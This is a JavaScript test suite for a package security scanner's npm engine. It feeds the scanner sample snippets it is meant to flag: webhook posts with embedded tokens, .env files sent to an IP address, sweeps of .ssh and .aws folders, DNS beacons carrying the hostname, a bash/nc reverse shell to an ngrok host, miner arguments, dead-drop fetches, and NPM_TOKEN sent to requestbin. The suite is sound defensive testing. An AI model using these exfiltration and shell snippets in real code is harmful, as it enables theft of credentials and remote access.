// 0.1.8: the exfiltration shapes in the npm engine — a webhook whose secret
// is written in the code (any service), local files sent to a raw IP address,
// a sweep of credential folders, the host name sent to a hidden address or in
// a DNS name, the public IP address sent to a capture service (local data read
// as a flow; the list names where it goes), a reverse shell as an argument
// list, a miner, a raw socket and rewritten browser shortcuts at install time;
// 0.1.8: a DNS name built outside a template or in a shell command, a
// destination fetched at run time (a dead drop), the host name read through
// require('os').
// Twin of python/tests/scanner/test_exfiltration_shapes.py; on a random
// corpus the engines are held to each other by
// tests/architecture/test_js_parity_hooks.py. The secrets are fake and built
// here; hosts are .invalid or TEST-NET; nothing is executed.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { run, installScriptRisk, importTimeRisk, importTimeSeverity } from "../src/index.js";
import { secretEndpointAt, credentialSweepAt, minerAt, rawIpConnect, dnsBeaconAt, deadDropAt } from "../src/lib/hooks.js";
import { pyStripChars } from "../src/lib/pycompat.js";

const TG = "1234567" + "89:AA" + "bC3dE5fG7hJ9kL1mN3pQ5rS7tV9wX1yZ3";
const SLACK = "hooks.slack.com/services/" + "TABCDEF12/" + "BABCDEF12/" + "aBcDeFgHiJkLmNoPqRsTuV12";
const KEY = "Zx9" + "Qw7Er5Ty3Ui1Op0As2Df4Gh6";
const WEBHOOK = (host) => `sends data to a webhook whose secret is written in the code (${host})`;
const XMR = "4" + "AbCdEfGhJk".repeat(10).slice(0, 94);
const onImport = (text, lang = "js") => {
  const [reasons] = importTimeRisk(text, lang);
  return [reasons, reasons.length ? importTimeSeverity(reasons) : null];
};

test("a webhook whose secret is in the code, any service", () => {
  const bot = "const { exec } = require('child_process');\nconst T = '" + TG + "';\n"
    + "exec(`curl -s \"https://api.telegram.org/bot${T}/sendMessage?chat_id=1&text=${t}\"`);\n";
  assert.deepEqual(onImport(bot), [[WEBHOOK("api.telegram.org")], "CRITICAL"]);
  assert.deepEqual(onImport("var webhookUrl = 'https://" + SLACK + "';\nawait fetch(webhookUrl, {});\n"),
    [[WEBHOOK("hooks.slack.com")], "CRITICAL"]);
  const xhr = "const x = new XMLHttpRequest();\nx.open('POST', 'https://in.x.invalid/w/" + KEY + "');\nx.send(d);\n";
  assert.deepEqual(onImport(xhr), [[WEBHOOK("in.x.invalid")], "CRITICAL"]);
  const wrapper = "import requests\nHOOK = 'https://hooks.x.invalid/in/" + KEY + "'\n"
    + "def send(url, payload):\n    return requests.post(url, json=payload)\nsend(HOOK, {'m': 1})\n";
  assert.deepEqual(onImport(wrapper, "py"), [[WEBHOOK("hooks.x.invalid")], "CRITICAL"]);
  // the user's token, a placeholder, no network call, a path of words, a hash
  for (const text of ["const t = process.env.TG;\nfetch(`https://api.telegram.org/bot${t}/getMe`);\n",
    "fetch('https://hooks.slack.com/services/T00000000/B00000000/" + "X".repeat(24) + "');\n",
    "const T = '" + TG + "'; // https://api.telegram.org\n",
    "fetch('https://x.invalid/api/v2/GetUserProfileInformation');\n",
    "fetch('https://x.invalid/c/3f2a1b4c5d6e7f8091a2b3c4d5e6f708');\n"]) {
    assert.equal(secretEndpointAt(text), null, text);
  }
});

test("credentials: files sent to an IP address, a sweep of folders", () => {
  const hrp = "const fs = require('fs');\nconst https = require('https');\nconst d = fs.readFileSync('.env', 'utf8');\n"
    + "https.get(`https://203.0.113.9:8855/1?data=${encodeURIComponent(d)}`);\n";
  assert.deepEqual(onImport(hrp), [["reads local files and sends them to an IP address (203.0.113.9)"], "CRITICAL"]);
  assert.deepEqual(onImport(hrp.replace("203.0.113.9", "10.0.0.9"))[0], []);
  const sweep = "const https = require('https');\nconst DIRS = ['.ssh', '.aws', '.ethereum', '.kube'].map((d) => join(home, d));\n";
  assert.deepEqual(credentialSweepAt(sweep), [sweep.indexOf("'.ssh'"), ["ssh", "aws", "ethereum", "kube"]]);
  assert.equal(importTimeSeverity(onImport(sweep)[0]), "CRITICAL");
  assert.equal(credentialSweepAt("const PATHS = ['.ssh', '.aws'];\n"), null);
});

test("the machine's names and address sent out", () => {
  const dns = "const dns = require('dns');\nconst os = require('os');\ndns.lookup(`${os.hostname()}.c.x.invalid.com`, cb);\n";
  assert.deepEqual(onImport(dns), [["sends the machine's user or host name in a DNS lookup of a name it builds"], "CRITICAL"]);
  const tunnel = "const { exec } = require('child_process');\n"
    + "exec(`curl -X POST \"https://7195e44e.ngrok-free.app/t/$(whoami)/$(hostname)/\"`, () => {});\n";
  assert.deepEqual(onImport(tunnel),
    [["sends the machine's user or host name to a data-capture service (7195e44e.ngrok-free.app)"], "CRITICAL"]);
  const ip = "const ip = await (await fetch('https://api.ipify.org')).text();\n"
    + "await fetch('https://webhook.site/0000', { method: 'POST', body: ip });\n";
  assert.deepEqual(onImport(ip), [["sends the machine's public IP address to a data-capture service (webhook.site)"], "CRITICAL"]);
  assert.deepEqual(onImport("const c = await (await fetch('https://ipinfo.io/json')).json();\nfetch(MIRRORS[c.country]);\n")[0], []);
});

test("reverse shells as argument lists, miners, raw sockets and shortcuts at install time", () => {
  assert.deepEqual(onImport("const { spawn } = require('child_process');\nspawn('bash', ['-i', 'nc', '2.tcp.eu.ngrok.io', '12151']);\n"),
    [["opens a reverse shell"], "CRITICAL"]);
  const miner = "const cp = require('child_process');\ncp.spawn(path, ['-u', '" + XMR + "', '-o', 'pool.x.invalid:8080']);\n";
  assert.equal(minerAt(miner), miner.indexOf(XMR));
  assert.equal(minerAt("const ADDRESS = '" + XMR + "';\n"), -1);
  const sock = "const net = require('net');\nconst ip = '203.0.113.5';\nconst s = net.connect(12345, ip);\n";
  assert.equal(rawIpConnect(sock), "203.0.113.5");
  assert.ok(installScriptRisk(sock).includes("contacts an address typical of data exfiltration (203.0.113.5)"));
  assert.equal(rawIpConnect(sock.replace("203.0.113.5", "127.0.0.1")), null);
  assert.equal(rawIpConnect(sock.replace("203.0.113.5", "8.8.8.8")), null);
  const lnk = "for (const f of glob.sync('*.lnk')) {\n  const s = shell.CreateShortcut(f);\n  s.Arguments = '--load-extension=' + ext;\n" +
    "  s.Save();\n}\n";
  assert.ok(installScriptRisk(lnk).includes("rewrites the shortcuts of programs on the machine"));
  const own = "const s = shell.CreateShortcut(path.join(desktop, 'MyApp.lnk'));\ns.TargetPath = exe;\ns.Save();\n";
  assert.ok(!installScriptRisk(own).includes("rewrites the shortcuts of programs on the machine"));
});

const DNS_BUILT = "sends the machine's user or host name in a DNS lookup of a name it builds";
const DEAD_DROP = (host) => `sends the machine's user or host name to an address it fetches at run time (from ${host})`;

test("a DNS name built from values in code or in a shell command (0.1.8)", () => {
  for (const [text, lang] of [
    ["const os = require('os');\nconst dns = require('dns');\nconst h = os.hostname();\ndns.lookup(h + '.u.x.invalid.com', () => {});\n", "js"],
    ["const os = require('os'), dns = require('dns');\nconst q = os.hostname() + '.x.invalid.com';\ndns.resolve(q, () => {});\n", "js"],
    ["import socket\nh = socket.gethostname()\nsocket.gethostbyname('%s.x.invalid.com' % h)\n", "py"],
    ["import socket\nh = socket.gethostname()\nsocket.gethostbyname('{}.x.invalid.com'.format(h))\n", "py"],
    ["import os, socket\nos.system('nslookup ' + socket.gethostname() + '.x.invalid.com')\n", "py"],
  ]) {
    const [reasons, sev] = onImport(text, lang);
    assert.ok(reasons.includes(DNS_BUILT), text);
    assert.equal(sev, "CRITICAL", text);
  }
  for (const cmd of ["nslookup $(whoami).$(hostname).x.invalid.com", "ping -c 1 `whoami`.x.invalid.com",
    "nslookup %USERNAME%.%COMPUTERNAME%.x.invalid.com", "dig $USER.x.invalid.com",
    "Resolve-DnsName $env:COMPUTERNAME.x.invalid.com"]) {
    assert.ok(installScriptRisk(cmd).includes(DNS_BUILT), cmd);
  }
  // quiet: a machine looking itself up, a reserved domain, an assignment, the identity in a path
  for (const text of ["import socket\nip = socket.gethostbyname(socket.gethostname())\n",
    "const os = require('os'), dns = require('dns');\ndns.lookup(os.hostname() + '.internal', cb);\n",
    "ping -c 1 $(hostname).local", "host=$(hostname).x.invalid.com", "curl -s http://x.invalid.com/$(whoami)"]) {
    assert.equal(dnsBeaconAt(text, true), -1, text);
  }
});

test("a dead drop: the destination fetched at run time from a literal URL (0.1.8)", () => {
  for (const [text, lang, host] of [
    ["import requests, socket\ncfg = requests.get('https://pastebin.com/raw/abc').json()\n"
      + "requests.post(cfg['url'], json={'h': socket.gethostname()})\n", "py", "pastebin.com"],
    ["const os = require('os');\nfetch('https://x.github.io/c.json').then((r) => r.json()).then((c) => "
      + "fetch(c.hook, { method: 'POST', body: JSON.stringify({ h: os.hostname() }) }));\n", "js", "x.github.io"],
    ["const os = require('os'), axios = require('axios');\n(async () => { const { data } = await axios.get("
      + "'https://gist.githubusercontent.com/u/x/raw/c.json'); await axios.post(data.url, { h: os.hostname() }); })();\n",
    "js", "gist.githubusercontent.com"],
  ]) {
    const [reasons, sev] = onImport(text, lang);
    assert.ok(reasons.includes(DEAD_DROP(host)), text);
    assert.equal(sev, "CRITICAL", text);
    assert.ok(installScriptRisk(text).includes(DEAD_DROP(host)), text);
  }
  // quiet: a GET of the fetched address, a literal destination, no literal URL fetched, an update check
  for (const text of ["import requests, socket\ncfg = requests.get('https://x.github.io/c.json').json()\n"
    + "requests.get(cfg['url'])\nsocket.gethostname()\n",
  "import requests, socket\ncfg = requests.get('https://x.github.io/c.json').json()\n"
    + "requests.post('https://api.x.invalid/x', json=cfg)\nsocket.gethostname()\n",
  "import requests, socket\ncfg = requests.get(base + '/c.json').json()\n"
    + "requests.post(cfg['url'], json={'h': socket.gethostname()})\n",
  "const os = require('os');\nfetch('https://registry.npmjs.org/x/latest').then((r) => r.json())"
    + ".then((j) => { if (j.version !== v) console.log('update', j.version); });\nos.hostname();\n"]) {
    assert.equal(deadDropAt(text), null, text);
  }
  // the shape without the host name read is no sign
  const quiet = "import requests\ncfg = requests.get('https://pastebin.com/raw/abc').json()\n"
    + "requests.post(cfg['url'], json={'v': 1})\n";
  assert.notEqual(deadDropAt(quiet), null);
  assert.deepEqual(onImport(quiet), [[], null]);
});

test("the host name read through require('os') or a destructured import (0.1.8)", () => {
  for (const text of ["const req = require('https').request('https://x.invalid/', { method: 'POST' }, () => {});\n"
    + "req.end(JSON.stringify({ h: require('os').hostname(), c: process.cwd() }));\n",
  "const { hostname, platform } = require('os');\nfetch('https://x.invalid/', { method: 'POST', body: hostname() });\n",
  "import { userInfo } from 'node:os';\nfetch('https://x.invalid/', { method: 'POST', body: userInfo().username });\n"]) {
    assert.ok(installScriptRisk(text).includes("sends the machine's user or host name over the network"), text);
  }
  assert.deepEqual(installScriptRisk("const { a, b } = require('os');\nfetch('https://x.invalid/');\n"), []);
});

test("hostile inputs finish fast", () => {
  const texts = {
    tokens: "import requests\napi.telegram.org\n" + ("'123456789:AA" + "A".repeat(33) + "', ").repeat(20000),
    "ip literals": "connect\n" + "'203.0.113.7', ".repeat(50000),
    "credential folders": "import requests\n" + "'.ssh', x, ".repeat(30000),
    "environment copies": "import os\n" + "e = dict(os.environ)\n".repeat(20000) + "x" + " ".repeat(100000),
    "dns lookups": "import socket\nsocket.gethostname()\n" + ("getaddrinfo(f'{a}" + "b".repeat(200) + "', 1)\n").repeat(5000),
    "reverse shell args": "'nc'" + " '-x',".repeat(50000),
    monero: "'-o' exec(" + ("4" + "a".repeat(93) + "! ").repeat(5000),
    "a long line": 'getaddrinfo(f"' + "{a}.".repeat(50000) + "\n",
    "dead drop fetches": "import socket\nsocket.gethostname()\n" + "c = requests.get('https://x.invalid/c').json()\n".repeat(5000)
      + "requests.post(c['u'], data=1)\n".repeat(5000),
    "dead drop chains": "const os = require('os');\nos.hostname();\nfetch('https://x.invalid/c')" + ".then((r) => r)".repeat(50000) + "\n",
    "dead drop one line": "import socket\nsocket.gethostname()\nc = urlopen('https://x.invalid/c')\nx = c" + " + c".repeat(200000) + "\n",
    "dns assigned names": "import socket\nsocket.gethostname()\n" + "q = h + '.x.invalid.com'\n".repeat(20000)
      + "socket.gethostbyname(q)\n".repeat(20000),
    "dns shell identities": "nslookup " + "$(whoami)".repeat(100000) + "\n" + "echo " + "$(whoami).x.invalid.com ".repeat(50000),
  };
  for (const [label, text] of Object.entries(texts)) {
    const start = performance.now();
    importTimeRisk(text, "py");
    installScriptRisk(text);
    assert.ok(performance.now() - start < 5000, label);
  }
});

test("str.strip(chars) in linear time", () => {
  // a regex like /^[T0]+|[T0]+$/ would take quadratic time on a long run of
  // 0s (CodeQL's js/polynomial-redos); the shell reader strips a host's brackets
  for (const [team, left] of [["T00000000", ""], ["T0000A000", "A"], ["TABCDEF12", "ABCDEF12"], ["", ""]]) {
    assert.equal(pyStripChars(team, "T0"), left, team);
  }
  const start = performance.now();
  assert.equal(pyStripChars("0".repeat(2_000_000) + "x", "T0"), "x");
  assert.ok(performance.now() - start < 1000);
});

test("--deps: a dependency whose main posts to a Slack webhook in its code", () => {
  const files = {
    "package.json": JSON.stringify({ name: "app", version: "1.0.0" }),
    "node_modules/fp/package.json": JSON.stringify({ name: "fp", version: "1.0.9", main: "dist/index.js" }),
    "node_modules/fp/dist/index.js": "var webhookUrl = 'https://" + SLACK + "';\n"
      + "async function send(m) { await fetch(webhookUrl, { method: 'POST', body: m }); }\nmodule.exports = { send };\n",
  };
  const root = mkdtempSync(join(tmpdir(), "lz-exfil-"));
  const out = mkdtempSync(join(tmpdir(), "lz-exfil-out-"));
  try {
    for (const [rel, data] of Object.entries(files)) {
      mkdirSync(dirname(join(root, rel)), { recursive: true });
      writeFileSync(join(root, rel), data);
    }
    run(["check", root, "--deps", "--out-dir", out, "--no-html", "--quiet"], { out: () => {}, err: () => {}, env: {} });
    const rep = JSON.parse(readFileSync(join(out, "lazaret-report.json"), "utf8"));
    const got = rep.issues.filter((i) => i.rule === "SC-IMPORT-RISK").map((i) => [i.file.replaceAll("\\", "/"), i.sev]);
    assert.deepEqual(got, [["node_modules/fp/dist/index.js", "CRITICAL"]]);
  } finally {
    rmSync(root, { recursive: true, force: true });
    rmSync(out, { recursive: true, force: true });
  }
});

test("RequestBin by its host names only: requestBinary() is not an address", () => {
  // chromedriver's and phantomjs-prebuilt's installers define requestBinary()
  // to download their binaries (Python twin: RequestBinTests)
  const installer = "const request = require('request');\n"
    + "function requestBinary(requestOptions, filePath) {\n"
    + "  return new Promise((resolve) => request(requestOptions).pipe(fs.createWriteStream(filePath)));\n}\n"
    + "requestBinary(getRequestOptions(), downloadedFile).then(extractDownload);\n";
  assert.deepEqual(installScriptRisk(installer), []);
  for (const host of ["requestbin.com", "enx1.x.requestbin.net", "requestbin.io", "requestb.in"]) {
    const text = `const https = require('https');\nhttps.get('https://${host}/r/abc?d=' + process.env.NPM_TOKEN);\n`;
    // (0.1.8: a token in a request's address counts where the address is a capture service's)
    assert.deepEqual(installScriptRisk(text), ["sends environment variables over the network (NPM_TOKEN)",
      `contacts an address typical of data exfiltration (${host.split("x.").pop()})`], host);
  }
  const mirror = "const https = require('https');\nhttps.get('https://mirror.x.invalid/d?t=' + process.env.NPM_TOKEN);\n";
  assert.deepEqual(installScriptRisk(mirror), []);
  const beacon = "import socket, requests\nrequests.post('https://requestbin.net/r/abc', data=socket.gethostname())\n";
  assert.deepEqual(onImport(beacon, "py"),
    [["sends the machine's user or host name to a data-capture service (requestbin.net)"], "CRITICAL"]);
});
